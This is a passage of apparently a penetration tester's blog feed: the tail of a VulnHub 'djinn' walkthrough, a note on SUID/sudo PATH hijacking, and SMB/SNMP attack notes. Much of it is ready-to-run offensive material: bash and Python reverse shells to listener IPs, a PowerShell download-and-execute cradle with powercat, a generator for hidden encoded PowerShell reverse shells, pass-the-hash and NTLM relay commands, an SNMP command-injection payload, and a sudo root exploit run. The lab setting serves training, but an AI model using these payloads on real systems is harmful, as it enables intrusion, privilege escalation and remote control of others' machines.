.dev/creds.txt<br><span class="hljs-built_in">cat</span> .dev/creds.txt<br>nitish:p4ssw0rdStr3r0n9<br>www-data@djinn:/home/nitish$ su nitish<br>su nitish<br>Password: p4ssw0rdStr3r0n9<br><br>nitish@djinn:~$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>nitish<br>nitish@djinn:~$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 32<br>drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 .<br>drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..<br>-rw------- 1 root   root    130 Nov 12  2019 .bash_history<br>-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc<br>drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache<br>drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev<br>drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg<br>-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt<br>nitish@djinn:~$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>10aay8289ptgguy1pvfa73alzusyyx3c<br>nitish@djinn:~$ <br></code></pre></td></tr></table></figure><p>so we get user.txt</p><h1 id="ğŸ›¡ï¸-PE"><a href="#ğŸ›¡ï¸-PE" class="headerlink" title="ğŸ›¡ï¸ PE"></a>ğŸ›¡ï¸ PE</h1><h2 id="sudo-exploit-PE"><a href="#sudo-exploit-PE" class="headerlink" title="sudo exploit PE"></a>sudo exploit PE</h2><p>when u are in practice,use kernel vulnerabilities as little as possible, if the designerâ€™s idea of â€‹â€‹elevating privileges is not kernel vulnerabilities<br>after check the system version and sudo version,it seems be exploit </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">nitish@djinn:/opt/80/templates$ lsb_release -a<br>lsb_release -a<br>No LSB modules are available.<br>Distributor ID:Ubuntu<br>Description:Ubuntu 18.04.3 LTS<br>Release:18.04<br>Codename:bionic<br>Â·Â·Â·<br>nitish@djinn:/opt/80/templates$ sudo -V<br>sudo -V<br>Sudo version 1.8.21p2<br>Sudoers policy plugin version 1.8.21p2<br>Sudoers file grammar version 46<br>Sudoers I/O plugin version 1.8.21p2<br></code></pre></td></tr></table></figure><p>so we could use this exploit:<code>https://github.com/worawit/CVE-2021-3156</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">nitish@djinn:~$ python3 exploit_sudo.py<br>python3 exploit_sudo.py<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ./proof.sh</span><br>./proof.sh<br>TERM environment variable not <span class="hljs-built_in">set</span>.<br>    _                        _             _ _ _ <br>   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |<br>  / _ \ | <span class="hljs-string">&#x27;_ ` _ \ / _` |_  / | &#x27;</span>_ \ / _` | | | |<br> / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|<br>/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)<br>                                     |___/       <br>djinn pwned...<br>__________________________________________________________________________<br><br>Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc<br>Path: /root<br>Date: Fri Mar 15 10:31:12 IST 2024<br>Whoami: root<br>__________________________________________________________________________<br><br>By @0xmzfr<br><br>Thanks to my fellow teammates <span class="hljs-keyword">in</span> @m0tl3ycr3w <span class="hljs-keyword">for</span> betatesting! :-)<br></code></pre></td></tr></table></figure><h2 id="default-PE"><a href="#default-PE" class="headerlink" title="default PE"></a>default PE</h2><p>there was a sudo binary file,we could find help by man<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6d14dce05c3e5b9c5c0da.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9ce703b91eb53e5f8589b.png"><br>by lots of try,i find we could get samâ€™s shell by this <code>-cmd</code><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3b8c991a8cc32ac4fdac0.png"><br>sam have the sudo too.<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9f96c01e3855e6459e4cd.png"><br>after try,it seems nothing,letâ€™s enum next<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b8378f56bf66f610250bd.png"><br>we just find the <code>.pyc</code> file in samâ€™s home,letâ€™s uncompile it<br>first we need download it from machine,we could copy it to web directory or start a python web</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m SimpleHTTPServer <br></code></pre></td></tr></table></figure><p>and uncompiled it(by tools <em>uncompyle6</em>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">uncompyle6 .pyc<br><span class="hljs-comment"># uncompyle6 version 3.9.0</span><br><span class="hljs-comment"># Python bytecode version base 2.7 (62211)</span><br><span class="hljs-comment"># Decompiled from: Python 2.7.18 (default, Aug  1 2022, 06:23:55) </span><br><span class="hljs-comment"># [GCC 12.1.0]</span><br><span class="hljs-comment"># Embedded file name: /home/mzfr/scripts/exp.py</span><br><span class="hljs-comment"># Compiled at: 2019-11-07 21:05:18</span><br>from getpass import getuser<br>from os import system<br>from random import randint<br><br>def naughtyboi():<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Working on it!! &#x27;</span><br><br>def guessit():<br>    num = randint(1, 101)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Choose a number between 1 to 100: &#x27;</span><br>    s = input(<span class="hljs-string">&#x27;Enter your number: &#x27;</span>)<br>    <span class="hljs-keyword">if</span> s == num:<br>        system(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Better Luck next time&#x27;</span><br><br>def readfiles():<br>    user = getuser()<br>    path = input(<span class="hljs-string">&#x27;Enter the full of the file to read: &#x27;</span>)<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;User %s is not allowed to read %s&#x27;</span> % (user, path)<br><br>def options():<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;What do you want to do ?&#x27;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;1 - Be naughty&#x27;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;2 - Guess the number&#x27;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;3 - Read some damn files&#x27;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;4 - Work&#x27;</span><br>    choice = int(input(<span class="hljs-string">&#x27;Enter your choice: &#x27;</span>))<br>    <span class="hljs-built_in">return</span> choice<br><br>def main(op):<br>    <span class="hljs-keyword">if</span> op == 1:<br>        naughtyboi()<br>    <span class="hljs-keyword">elif</span> op == 2:<br>        guessit()<br>    <span class="hljs-keyword">elif</span> op == 3:<br>        readfiles()<br>    <span class="hljs-keyword">elif</span> op == 4:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;work your ass off!!&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Do something better with your life&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(options())<br><span class="hljs-comment"># okay decompiling Untitled.pyc</span><br></code></pre></td></tr></table></figure><p>though otherâ€™s walkthrough,it seems the python2â€™s exploit in func<code>input</code><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1bfea061eed9a5bc62602.png"><br>letâ€™s get root<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/80db1e469430f61f46d6d.png"></p><h1 id="ğŸ“–-recommend-article"><a href="#ğŸ“–-recommend-article" class="headerlink" title="ğŸ“– recommend article"></a>ğŸ“– recommend article</h1><p><a href="https://www.hackingarticles.in/djinn1-vulnhub-walkthrough/">walkthrouth by Raj Chandel</a>(python2 exploit PE)<br><a href="https://lifesfun101.github.io/2019/12/07/Djinn-walkthrough.html#privilege-escalation-rooute-1">walkthrough another one</a>(there was another PE way!)<br><a href="https://www.vulnhub.com/entry/djinn-1,397/">download djinn</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUID,SUDO binary hijack</title>
    <link href="/SUID,SUDO-binary-hijack/"/>
    <url>/SUID,SUDO-binary-hijack/</url>
    
    <content type="html"><![CDATA[<h1 id="find-the-suid-file"><a href="#find-the-suid-file" class="headerlink" title="find the suid file"></a>find the suid file</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -4000 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>if it was in the list of GTFObins<br><em><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></em><br>so excute command follow GTFObins,if it not in the list.<br>use follow ways</p><h1 id="Sudo-command-SUID-binary-without-command-path"><a href="#Sudo-command-SUID-binary-without-command-path" class="headerlink" title="Sudo command/SUID binary without command path"></a>Sudo command/SUID binary without command path</h1><p><strong>sudo:</strong><br>If the <strong>sudo permission</strong> is given to a single command <em>without specifying the path</em>: <strong>hacker10 ALL= (root) less</strong> you can exploit it by changing the PATH variable</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/tmp:$PATH<br><span class="hljs-comment">#Put your backdoor in /tmp and name it &quot;less&quot;</span><br>sudo less<br></code></pre></td></tr></table></figure><p><strong>suid:</strong><br>using strings to check the suid file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings reset_pass <br>Â·Â·Â·<br><span class="hljs-built_in">echo</span> john:john | chpasswd<br>Â·Â·Â·<br></code></pre></td></tr></table></figure><p>in this binary file, it dont specify the command path,so we could inject the path</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">export</span> PATH=$(<span class="hljs-built_in">pwd</span>):<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p>check the PATH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/home/john:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin<br></code></pre></td></tr></table></figure><p>and move the bound reverse-shell into this path(/home/john) and name it chpasswd(remember add x to the file)<br>bound reverse-shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/192.168.166.195/80 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>and excute the suid binary file.<br>or we could add a suid bash file</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&#x27;#!/bin/bash\ncp /bin/bash /dev/shm/bash\nchmod 4775 /dev/shm/bash&#x27;</span>&gt; chpasswd<br><span class="hljs-built_in">chmod</span> 777 chpasswd<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/dev/shm/bash -p<br></code></pre></td></tr></table></figure><p>if i meet new situation, i will update the article.</p><h1 id="recommend-blog-or-material"><a href="#recommend-blog-or-material" class="headerlink" title="recommend blog or material"></a>recommend blog or material</h1><p><a href="https://medium.com/r3d-buck3t/hijacking-relative-paths-in-suid-programs-fed804694e6e">Hijacking Relative Paths in SUID Programs | by Nairuz Abulhul | R3d Buck3T | Medium</a></p><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-command-suid-binary-without-command-path">Linux Privilege Escalation | HackTricks | HackTricks</a></p><p><a href="https://juggernaut-sec.com/suid-sgid-part-2-lpe/#Exploiting_SUID_Binaries_%E2%80%93_Shared_Object_Injection">SUID | SGID Part-2 â€“ Linux Privilege Escalation</a></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>penetrate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SMB,SMTP,SNMP enum</title>
    <link href="/SMB-SMTP-SNMP-enum/"/>
    <url>/SMB-SMTP-SNMP-enum/</url>
    
    <content type="html"><![CDATA[<h1 id="SMB-attack"><a href="#SMB-attack" class="headerlink" title="SMB attack"></a>SMB attack</h1><p>tools of manage smb and enum:<br><em>enum4linux</em><br><em>CrackMapExec</em><br><em>smbclient</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //ip<br></code></pre></td></tr></table></figure><p>login by hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b<br><span class="hljs-built_in">dir</span><br>get secrets.txt<br></code></pre></td></tr></table></figure><ul><li><code>-U</code> set user</li><li><code>--pw-nt-hash</code> use passwd hash </li></ul><p>login by passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient  \\\\172.16.205.11\\<span class="hljs-built_in">test</span> -U joe --password=Flowers1<br></code></pre></td></tr></table></figure><p>tools of command excute:<br><em>impacket-wmiexec</em><br><em>impacket-psexec</em><br>use hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs BASH">impacket-psexec -hashes 00000000000000000000000000000000:b2c03054c306ac8fc5f9d188710b0168 administrator@192.168.214.121<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-wmiexec -hashes 00000000000000000000000000000000:2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.216.70<br></code></pre></td></tr></table></figure><ul><li><code>-hashs</code> use â€œLMHash:NTHashâ€,if there was no LM,use 32bit 0</li><li>second parameter: â€œusername@ipâ€</li></ul><p>use passwd to get a shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-smbexec MEDTECH/joe:Flowers1@172.16.205.11<br></code></pre></td></tr></table></figure><p><em>impacket-ntlmrelayx</em><br>smb-relay passwd-hash(u cant crack)<em>no UAC</em><br>this module could relay a command to the target use the hash of passwd,if they have the same hash</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">users:<br>machine:FILE01 FILE02<br>users <span class="hljs-keyword">in</span> FILE01:<br>sam administrator file02admin<br>users <span class="hljs-keyword">in</span> FILE02:<br>dave administrator file02admin<br><br>so <span class="hljs-keyword">if</span> we have <span class="hljs-keyword">the</span> hash <span class="hljs-keyword">of</span> authencation message <span class="hljs-keyword">of</span> file02admin,we could use <span class="hljs-keyword">the</span> hash <span class="hljs-keyword">of</span> authencation <span class="hljs-built_in">to</span> pass <span class="hljs-keyword">the</span> authencation <span class="hljs-keyword">of</span> FILE02 <span class="hljs-keyword">and</span> excute <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span><br><span class="hljs-keyword">the</span> authencation about smb (Net-NTLMv2)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c <span class="hljs-string">&quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</span><br></code></pre></td></tr></table></figure><p>powershell reverse shell one-liner</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> IEX (New-Object System.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://192.168.45.210/powercat.ps1&#x27;</span>);<span class="hljs-attribute">powercat</span> -c <span class="hljs-number">192.168.45.210</span> -p <span class="hljs-number">4444</span> -e cmd<br></code></pre></td></tr></table></figure><p><a href="https://www.base64encode.org/">https://www.base64encode.org/</a> encode the liner by utf-16le charset</p><p>reverse shell just powershell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><br>payload = <span class="hljs-string">&#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.205.121&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;</span><br><br>cmd = <span class="hljs-string">&quot;powershell -nop -w hidden -e &quot;</span> + base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf16&#x27;</span>)[<span class="hljs-number">2</span>:]).decode()<br><br><span class="hljs-built_in">print</span>(cmd)<br></code></pre></td></tr></table></figure><ul><li><code>--no-http-server</code> ban http server cause we use smb relay</li><li><code>-t</code> set the target</li><li><code>-smb2support</code> add the support to smb2</li><li><code>-c</code> set the command<br>in the FILE01 machine<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">45.210</span>\test<br></code></pre></td></tr></table></figure></li></ul><p>check the dir of smb</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#powershell</span><br><span class="hljs-built_in">ls</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>\share<br>cmd<br><span class="hljs-built_in">dir</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>\share<br></code></pre></td></tr></table></figure><p><em>net view</em>(Windows)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net view \\name /all<br></code></pre></td></tr></table></figure><p><em>nbtscan</em></p><h1 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h1><p>skip!!!</p><h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><p><a href="https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-snmp">snmp hacktricks</a><br>SNMP MIB tree</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1.3.6.1.2.1.25.1.6.0</td><td>System Processes</td></tr><tr><td>1.3.6.1.2.1.25.4.2.1.2</td><td>Running Programs</td></tr><tr><td>1.3.6.1.2.1.25.4.2.1.4</td><td>Processes Path</td></tr><tr><td>1.3.6.1.2.1.25.2.3.1.4</td><td>Storage Units</td></tr><tr><td>1.3.6.1.2.1.25.6.3.1.2</td><td>Software Name</td></tr><tr><td>1.3.6.1.4.1.77.1.2.25</td><td>User Accounts</td></tr><tr><td>1.3.6.1.2.1.6.13.1.3</td><td>TCP Local Ports</td></tr></tbody></table><p>public common string</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span><br><span class="hljs-keyword">private</span><br>manager<br></code></pre></td></tr></table></figure><p>scan a range:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> public &gt; community<br><span class="hljs-built_in">echo</span> private &gt;&gt; community<br><span class="hljs-built_in">echo</span> manager &gt;&gt; community<br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 254); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> 192.168.50.<span class="hljs-variable">$ip</span>; <span class="hljs-keyword">done</span> &gt; ips<br>onesixtyone -c community -i ips<br></code></pre></td></tr></table></figure><p>tools:<br><em>snmpwalk</em>:<br>enume the hole tree</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -Oa -v1 -t 10 192.168.214.149<br></code></pre></td></tr></table></figure><ul><li><code>-c</code> set community string</li><li><code>-Oa</code> This parameter will automatically translate any hexadecimal string into ASCII that was otherwise not decoded.</li><li><code>-v1</code> specify the SNMP version number</li><li><code>-t</code> set the timeout period<br>enum the users(set OID 1.3.6.1.4.1.77.1.2.25 in the table)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.4.1.77.1.2.25<br></code></pre></td></tr></table></figure>enum the process<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.2.1.25.4.2.1.2<br></code></pre></td></tr></table></figure>enum the software installed <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.2.1.25.6.3.1.2<br></code></pre></td></tr></table></figure>enum the listening tcp port<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.149 1.3.6.1.2.1.6.13.1.3<br></code></pre></td></tr></table></figure>enum<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v 2c -c public 192.168.240.149 NET-SNMP-EXTEND-MIB::nsExtendOutputFull<br></code></pre></td></tr></table></figure><h2 id="brute"><a href="#brute" class="headerlink" title="brute"></a>brute</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf&gt; use auxiliary/scanner/snmp/snmp_login<br>nmap -sU --script snmp-brute 192.168.214.149 --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <br>onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt 192.168.214.149<br>hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.214.149 snmp<br></code></pre></td></tr></table></figure></li></ul><h2 id="RCE-in-snmp"><a href="#RCE-in-snmp" class="headerlink" title="RCE in snmp"></a>RCE in snmp</h2><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce">SNMP RCE hacktricks</a><br>if u enum the <em>run-on-read()</em>,it could rce</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v2c -c public 192.168.214.149 NET-SNMP-EXTEND-MIB::nsExtendObjects<br></code></pre></td></tr></table></figure><p>test:<br>inject the command</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public 192.168.214.149 \<br><span class="hljs-string">&#x27;nsExtendStatus.&quot;evilcommand&quot;&#x27;</span> = createAndGo \<br><span class="hljs-string">&#x27;nsExtendCommand.&quot;evilcommand&quot;&#x27;</span> = /bin/echo \<br><span class="hljs-string">&#x27;nsExtendArgs.&quot;evilcommand&quot;&#x27;</span> = <span class="hljs-string">&#x27;hello world&#x27;</span><br></code></pre></td></tr></table></figure><p>excute it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects<br></code></pre></td></tr></table></figure><p>inject the revserse shell<br><code>https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 <span class="hljs-string">&#x27;nsExtendStatus.&quot;command10&quot;&#x27;</span> = createAndGo <span class="hljs-string">&#x27;nsExtendCommand.&quot;command10&quot;&#x27;</span> = /usr/bin/python3.6 <span class="hljs-string">&#x27;nsExtendArgs.&quot;command10&quot;&#x27;</span> = <span class="hljs-string">&#x27;-c &quot;import sys,socket,os,pty;s=socket.socket();s.connect((\&quot;10.10.14.84\&quot;,8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\&quot;/bin/sh\&quot;)&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>listen the port and excute it</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -v2c -c public 192.168.214.149 NET-SNMP-EXTEND-MIB::nsExtendObjects<br></code></pre></td></tr></table></figure><p>or exploit<br><code>https://github.com/mxrch/snmp-shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install snmp snmp-mibs-downloader rlwrap -y<br>git <span class="hljs-built_in">clone</span> 